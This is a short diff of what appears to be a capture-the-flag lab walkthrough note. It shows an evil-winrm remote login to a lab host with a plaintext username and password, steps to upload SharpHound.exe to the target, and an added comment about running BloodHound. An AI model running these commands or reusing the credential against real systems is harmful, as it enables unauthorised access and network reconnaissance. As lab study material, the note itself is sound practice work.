@@ -83,6 +83,6 @@ evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
 #Download Sharphound.exe and save it in attack machine home
 #upload Sharphound on taget 
 upload /home/kali/SharpHound.exe #run this on target machine shell 
-
+#run bloodhound from host machine pending check run from already download file or compile it(Just for refrence not actual note)
 
 
